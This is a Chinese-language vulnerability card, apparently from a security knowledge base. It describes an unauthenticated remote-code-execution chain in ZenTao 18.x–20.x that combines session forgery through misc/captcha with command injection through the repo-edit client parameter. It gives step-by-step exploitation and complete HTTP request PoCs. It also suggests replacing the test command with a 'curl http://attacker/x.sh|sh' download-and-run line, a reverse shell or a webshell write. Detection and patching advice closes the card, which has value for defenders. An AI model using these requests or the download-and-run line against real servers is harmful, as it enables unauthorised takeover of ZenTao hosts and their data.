---
id: web-php-rce-zentao-captcha-session-repo-checkconnection-exec
title: 禅道 misc/captcha 任意 session 键 + repo 创建/编辑：SCM=Subversion 时 client 参数进 exec，仅凭前台 zentaosid 即可命令执行
type: scenario
domain: web
path: web/php/rce
technique: zentao-captcha-session-repo-checkconnection-exec
tags:
- php
- zentao
- command-injection
- session
- exec
- repo
cve: []
severity: critical
confidence: high
affected_versions: 禅道 18.x–20.x（原文分析范围；文中以 18.0-beta 为例）
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:53:59+08:00'
  notes: 已对照原文核对：misc/captcha 任意 session 键、isLogon 只信 session->user、checkClient 在 SCM=Gitlab 时返回 true、checkConnection 仅处理 Subversion/Gitea/Gogs/Git 且 Subversion 分支把 client 拼进 exec、repo-create 用 Gitlab 过 checkClient 后 repo-edit 改 SCM=Subversion 且 client 设为反引号 id 反引号、以及正文给出的完整请求包与 200 回显，均与正文一致；本次核对未读取图片，checkConnection 与 captcha 的代码截图（img/08-12）未核实，命令执行分支依据正文文字与 update 源码片段；未复现原文请求。
url: /docs/web/php/rce/web-php-rce-zentao-captcha-session-repo-checkconnection-exec/
draft: false
kb_aliases:
- 禅道 repo checkConnection 命令注入
- 禅道 captcha session 伪造
- 禅道 repo-edit SCM Subversion
- ZenTao client 参数命令注入
---

## 一句话结论

禅道 `misc/captcha` 会把请求里的任意键写进 session，而 `checkPriv` 只判断 `session->user` 是否存在，因此未登录访问一次 captcha 接口就能拿到一个「已登录」会话；随后用该会话先 `repo-create` 建一个 `SCM=Gitlab` 仓库（绕过 `checkClient`），再 `repo-edit` 把 `SCM` 改成 `Subversion`、`client` 设为 `` `id` ``，`repoModel::checkConnection()` 会把 `client` 拼进 `exec` 在服务器上执行命令。

## 原理

- **会话伪造**：`userModel::isLogon()` 的实现是 `$user = $this->session->user; return ($user && !empty($user->account) && $user->account != 'guest');`，只信任 session。`misc/control.php` 的 `captcha` 方法按请求参数把 key/value 写入 session（用于生成验证码种子），键名不受限，于是 `session->user` 可以被构造出来，鉴权判定直接通过。
- **checkClient 与 checkConnection 的分叉**：`repoModel::create()`/`update()` 在写库前调用 `checkClient()` 与 `checkConnection()`。`checkClient()` 在 `SCM=Gitlab` 时直接返回 true（走服务端 API 校验），而 `checkConnection()` 只对 `Subversion`、`Gitea`、`Gogs`、`Git` 分支做处理，其中 Subversion 分支会把 `$client` 拼进命令行交给 `exec`。
- **为什么分两步**：`create` 阶段用 `SCM=Gitlab` 过掉 `checkClient`（`update` 里若 `data->client != repo->client` 还会再查一次 `checkClient`），`edit` 阶段把 `SCM` 改成 `Subversion`，此时 `client` 已变更，`checkConnection()` 进入 Subversion 分支执行命令。`edit` 还要求仓库已存在，否则 302 跳转，所以必须先 create。
- **参数投影**：`update()` 里 `fixer::input('post')` 对 `SCM=Gitlab` 会把 `client`、`path` 强制清空，但对 `Subversion` 不清空，`skipSpecial('path,client,...')` 也放行了 `client` 中的特殊字符——这正是注入能成立的原因。
- **回显**：命令通过 `exec` 执行，`id` 之类命令的结果随响应返回（原文 200 回显），因此是可确认的 RCE，不是盲打。

## 触发条件

- 目标为受影响版本禅道（原文 18.x–20.x，例 18.0-beta），`/zentao/` 可访问。
- `misc-captcha-*` 这类方法在 `openMethods` 白名单内（默认配置下成立），可未授权访问。
- 数据库可写、`repo` 模块可用（禅道默认自带仓库功能）。
- Web 进程有权限执行 `svn`/系统命令（`exec` 未禁用）。

## 利用步骤

1. 打开 `/zentao/misc-captcha-user.html`，在响应/浏览器应用面板取到 `zentaosid`；必要时把 `user` 相关键一并写入 session。
2. 用该 `zentaosid` 发送 `repo-create`，**`SCM` 必须是 `Gitlab`**，否则会被 `checkClient` 拦下；记录返回的仓库 ID。
3. 发送 `repo-edit-<id>-<id>.html`，只提交 `SCM=Subversion&client=`id``（原文 payload），使 `checkConnection()` 进入 Subversion 分支执行。
4. 观察响应中的命令输出，确认 `exec` 生效；把 `client` 换成反弹 shell 或写文件命令即可进一步利用。
5. 若目标仓库列表里有现成仓库，可直接从 edit 起手，省掉 create。

## PoC

```http
POST /zentao/repo-create.html HTTP/1.1
Host: target
Cookie: zentaosid=<captcha 拿到的会话>; lang=zh-cn; device=desktop; theme=default
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid=
```

```http
POST /zentao/repo-edit-10000-10000.html HTTP/1.1
Host: target
Cookie: zentaosid=<同上>; lang=zh-cn; device=desktop; theme=default
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

SCM=Subversion&client=`id`
```

```text
预期：repo-create 成功返回仓库 ID；repo-edit 响应 200 且带 id 命令输出（uid=...）。
把 `id` 换成 `curl http://attacker/x.sh|sh` 或写 webshell 的命令完成利用。
```

## 变体与关联

- **session 写入点不止 captcha**：`commonModel::deny()` 里也会 `$this->session->set('user', $user)`，未授权访问被白名单放行但无权限的方法时同样能落一个 user 会话（原文另一条链即 `testcase::saveXmindImport`）。
- **其它 SCM 分支**：`Git`/`Gitea`/`Gogs` 分支同样会拼 `client`/`path` 进命令行，只是参数校验不同；`Subversion` 最容易注入。
- **无需事先 create 的情形**：目标已有任意仓库时可直接 edit；`client` 变更触发的是 `checkClient` 而非 `checkConnection` 的分支要读准版本代码。
- 关联：同产品的另一条未授权 RCE（`testcase::saveXmindImport` 会话伪造 + `api.php/v1/users` 建管理员）与本卡共用「session 可被未授权写入」这一根因，但最终 sink 不同；`repo` 模块的 `checkConnection` 也可被 `custom::ajaxSaveCustomFields` 写配置开启 `apiGetModel` 后经 `call_user_func_array` 调用。

## 检测与防御

- 修复：`misc/captcha` 只允许白名单键写 session（如 `captcha`/`rand`），禁止 `user`；`isLogon()` 不能只信 session，需校验服务端会话记录与用户状态。
- 修复 sink：`checkConnection()` 的 `client` 必须走白名单（只允许 `svn`/`git` 等固定值）或 `escapeshellarg`，禁止把用户输入拼进 `exec`。
- 检测：未登录状态下访问 `misc-captcha-*` 后立刻出现 `repo-create`/`repo-edit` 请求；`repo-edit` 请求体出现 `SCM=Subversion` 且 `client` 含反引号/`;`/`|`；Web 进程（php-fpm/www-data）派生 `sh -c svn ...` 子进程。
- 加固：`disable_functions` 去掉 `exec`/`shell_exec`/`system`；repo 功能仅管理员可用并加二次确认；审计 `openMethods` 白名单，不允许把带副作用的方法放进去。
